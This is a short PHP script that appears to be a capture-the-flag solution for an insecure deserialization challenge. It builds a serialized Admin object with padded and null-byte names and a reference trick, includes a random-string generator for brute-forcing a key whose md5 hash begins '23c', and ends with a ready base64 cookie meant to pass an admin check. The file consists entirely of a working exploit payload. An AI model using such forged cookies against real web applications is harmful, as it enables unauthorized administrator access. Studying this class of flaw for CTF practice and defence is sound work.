
<?php


class Validate{
  public $key = 'r44TdI0STt'; // md5 hash of this in php7.4 gives 23c....
}

class Admin{
  public $name;
  public $secret1;
  public $secret2;

  function __construct($name, $secret1, $secret2) {
    $this->name = $name;
    $this->secret1 = $secret1;
    $this->secret2 = $secret2;
  
  }

}

print_r(serialize(new Admin("admin     ", new Validate, new Validate)));

// Use this to run a while loop to find the md5 hash
function generateRandomString($length = 10) {
  $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
  $charactersLength = strlen($characters);
  $randomString = '';
  for ($i = 0; $i < $length; $i++) {
      $randomString .= $characters[random_int(0, $charactersLength - 1)];
  }
  return $randomString;
}

$final_cookie = "Tzo1OiJBZG1pbiI6Mzp7czo0OiJuYW1lIjtzOjEwOiJhZG1pbgAAAAAAIjtzOjc6InNlY3JldDEiO086ODoiVmFsaWRhdGUiOjE6e3M6Mzoia2V5IjtzOjEwOiJyNDRUZEkwU1R0Ijt9czo3OiJzZWNyZXQyIjtSOjM7fQ===";
// print_r(unserialize(base64_decode("Tzo1OiJBZG1pbiI6Mzp7czo0OiJuYW1lIjtzOjEwOiJhZG1pbgAAAAAAIjtzOjc6InNlY3JldDEiO086ODoiVmFsaWRhdGUiOjE6e3M6Mzoia2V5IjtzOjEwOiJyNDRUZEkwU1R0Ijt9czo3OiJzZWNyZXQyIjtSOjM7fQ===")));

  
?>
